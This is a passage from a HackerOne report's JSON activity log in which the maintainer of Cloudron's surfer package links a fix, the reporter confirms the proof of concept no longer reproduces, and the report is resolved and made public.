        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "nodejs-ecosystem"
    },
    {
      "id": 8951333,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "This has now been fixed with https://git.cloudron.io/cloudron/surfer/-/commit/060805d087712d5d7d82f0a0b948cbb2526ac907\n\nIt is the first time I am using hackerone, so I am not sure how to proceed further here.",
      "automated_response": false,
      "created_at": "2020-08-16T21:31:37.527Z",
      "updated_at": "2020-08-16T21:31:37.527Z",
      "actor": {
        "username": "nebulon",
        "cleared": false,
        "verified": false,
        "url": "/nebulon",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/aB4HRBYPt64phWJLezBaHSBT/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "nodejs-ecosystem"
    },
    {
      "id": 8951652,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "Thanks for providing a patch @nebulon.\n@d3lla can you confirm that this resolves the issue?",
      "automated_response": false,
      "created_at": "2020-08-17T00:03:24.507Z",
      "updated_at": "2020-08-17T00:03:24.507Z",
      "actor": {
        "username": "danielruf",
        "cleared": false,
        "verified": false,
        "url": "/danielruf",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/JjaMiHpqpLG3vx6VJMAA9KbK/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "nodejs-ecosystem"
    },
    {
      "id": 9003426,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "Hi @nebulon and @danielruf,\n\nSorry for my late reply.\n\n@nebulon thanks for your prompt reply and for the fix.\n\nYour changes seems to fix the problem.\nI run the previous steps of the PoC and I was not able to reproduce the previous reported result.\nI attached a PoC video.\n{F958371}\n\nThank you for your time and have a nice day,\nd3lla\n\nI tested using the following configurations:\n- OPERATING SYSTEM VERSION: Ubuntu 18.04.4 LTS\n- NODEJS VERSION: v14.2.0\n- NPM VERSION: 6.14.4",
      "automated_response": false,
      "created_at": "2020-08-21T16:11:22.314Z",
      "updated_at": "2020-08-21T16:12:00.052Z",
      "actor": {
        "username": "d3lla",
        "cleared": false,
        "verified": false,
        "url": "/d3lla",
        "profile_picture_urls": {
          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "attachments": [
        {
          "id": 958371,
          "filename": "poc_fix_surfer.mov",
          "type": "video/quicktime",
          "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/tUUWew9MTL332fRAraDE1p8Z?response-content-disposition=attachment%3B%20filename%3D%22poc_fix_surfer.mov%22%3B%20filename%2A%3DUTF-8%27%27poc_fix_surfer.mov&response-content-type=video%2Fquicktime&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQXL2TV4JY%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T072442Z&X-Amz-Expires=1498&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJIMEYCIQC6gxJ2Fgorv1CGF8se8AzeZarVMBLse4f%2Fv1LWZPPIbAIhAIe13AyRf7KoGQmk0MZsohJbY2mmh8fOJTnvWpEfZdoaKrEFCCMQAxoMMDEzNjE5Mjc0ODQ5IgzcVzLSCfqhl64LbOoqjgXEg5yJowTgB6h0qoSj2KgKW%2FmO5%2Fb22frcKudampbs5LOCE%2Bl%2BTzvnLlh8zfsY9Insep7fcRUtb%2F%2Ba%2BgVdyMNa5k1sDhv63hYhXctRIhsubT4u%2BKuj6RCLHJY3dXzqK889huk5FJgsPR61WQfBkCfEQC8iLWjotXcQ24R5LylVYeAdAfDTBXiQl0%2Ba%2BsgeYEoj5X7QnFy0DX62VlrQT9rRHS%2BIe%2F4W0R8qQqELu9%2Fy2ZB8v7fPotewALFtGyLN4MQlE6%2BVl4GI35jgi1WT1qpLseSJ1p25J9nDGI0NHpdpJMKM5E5L7%2B7%2BsgEZUdYkWeEF%2BG2KgYj%2BzPGsOkRbev%2BBTlxTRT56vZh2BRi%2B7sFDgxdE9NJnxxH8jgVf1E5Ct0dLWQGpSMpZO8f%2BytRKMtjz6dgiSnO6iQESsRG4RRbxtSJ8Q8G0cVH7H8u%2BerokbE32PnqwkjuLNE0gsVc8huN5G1P8RNdp8r2ey4m2akCouacY8lQOFlyPG6vZt7JBfvSkSSeDsbntLEW%2B5kw6heg5vyz4VHHUBtamMvWasHge4MYAJCQwVSCo6Bi9PphSSWqY5Fxm%2BNXcTJ7TPGzYD3k3A56HihvKmfDPJeQgsOSp4EIHxZNlD5RO4k6VuxWFSWHmfDKgnWPobSypItRUebo7ysrxPeAhcG2U%2FtrFJ6c2ZosszPY%2FH59x4%2BfV5NBF2Jd7i8ENzcU7YQRNAjqwgIPfx%2FneHwZpkr%2Byxa%2BJJ2OmPe9rY%2FzN0lLqdrjIoYEeo3EMS9SVaDjVLU4VHKBE7jBWfPqA4KtQ0k9%2BOXLZyOzFIt1Tw4LmwjOTNELjF19oHFeBobYeeWBAaW8yAqvbuqQ9vAW%2BzNZlxiXed4sFhe4whIa5qAY6sAHLr4%2F9PHLdkIzOpDMedWUTk8aJzmnJUfV88BMC69XqLdUVuF5lgOfwWykGqhdHJcdd3HpN5u%2FHo%2B83%2BGJoiPKJmXhOQe9FM5DVP4kYrIwsbZ4L0BTJd%2FkqEwGkjVprA7%2BEXsI%2FPKeL8nhijDijPctTq5akS%2FashM8yWrO3PeZId%2BcQDzw0vMnnxt3w6el0izvNlb%2FxKQ2ULn%2F8qTT7eIADRYt52%2BO3AJVBd%2F8I3XgSyA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=496f61f36e9e7322c9386cb0339331e719eb01798004c4fb085eb50d37347a23"
        }
      ],
      "genius_execution_id": null,
      "team_handle": "nodejs-ecosystem"
    },
    {
      "id": 9005561,
      "is_internal": false,
      "editable": false,
      "type": "Activities::BugResolved",
      "message": "",
      "automated_response": false,
      "created_at": "2020-08-21T20:49:10.929Z",
      "updated_at": "2020-08-21T20:49:10.929Z",
      "actor": {
        "username": "danielruf",
        "cleared": false,
        "verified": false,
        "url": "/danielruf",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/JjaMiHpqpLG3vx6VJMAA9KbK/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "reporter": {
        "username": "d3lla",
        "url": "/d3lla"
      },
      "genius_execution_id": null,
      "team_handle": "nodejs-ecosystem"
    },
    {
      "id": 9005563,
      "is_internal": false,
      "editable": false,
      "type": "Activities::AgreedOnGoingPublic",
      "message": "",
      "automated_response": false,
      "created_at": "2020-08-21T20:49:19.828Z",
      "updated_at": "2020-08-21T20:49:19.828Z",
      "first_to_agree": true,
      "actor": {
        "username": "danielruf",
        "cleared": false,
        "verified": false,
        "url": "/danielruf",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/JjaMiHpqpLG3vx6VJMAA9KbK/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "nodejs-ecosystem"
    },
    {
      "id": 9008037,
      "is_internal": false,
      "editable": false,
      "type": "Activities::AgreedOnGoingPublic",
      "message": "",
      "automated_response": false,
      "created_at": "2020-08-22T08:48:44.167Z",
      "updated_at": "2020-08-22T08:48:44.167Z",
      "actor": {
        "username": "d3lla",
        "cleared": false,
        "verified": false,
        "url": "/d3lla",
        "profile_picture_urls": {
          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "nodejs-ecosystem"
    },
    {
      "id": 9008038,
      "is_internal": false,
      "editable": false,
      "type": "Activities::ReportBecamePublic",
      "message": "",
      "automated_response": false,
      "created_at": "2020-08-22T08:48:44.209Z",
      "updated_at": "2020-08-22T08:48:44.209Z",
      "actor": {
        "username": "d3lla",
        "cleared": false,
        "verified": false,
        "url": "/d3lla",
        "profile_picture_urls": {
          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "nodejs-ecosystem"
    }
  ],
  "activity_page_count": 1,
  "activity_page_number": 1,
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}